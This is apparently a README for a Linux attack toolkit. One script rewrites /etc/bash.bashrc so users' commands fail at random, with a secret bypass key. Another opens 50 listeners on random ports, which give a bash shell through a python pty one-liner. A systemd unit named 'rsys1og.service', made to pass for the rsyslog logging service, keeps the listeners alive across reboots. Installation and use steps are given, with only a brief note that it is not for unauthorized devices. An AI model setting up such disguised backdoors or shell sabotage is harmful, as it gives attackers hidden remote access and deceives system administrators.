messWithBash.sh:

forces users to roll probability check before running bash commands if it fails the command does not run. 

also creates a copy of the original bash.bashrc file called bash.bashrc.bak


Steps to implement:
1. pull script to device
2. "sudo bash messWithBash.sh"
3. "sudo source /etc/bash.bashrc"

use "+++" to skip check. 
still prints command not found after command is run when using key to skip check.

Steps to remove:
1. "sudo source /etc/bash.bashrc.bak"


when executed, persistant listeners creates 50 listeners on random ports that can be used in combination with 
''' python -c 'import pty; pty.spawn("/bin/bash")' '''
to gain a bash shell

rsys1og.service can be added to the device to ensure that if the device is turned off the listeners will still activate, make sure to edit the file to include the listeners.sh path. Ignore read.txt it empty. 

THIS IS VERY NOISY, EASILY NOTICED AND IS NOT INTENDED TO BE USED ON UNAUTHORIZED DEVICES 
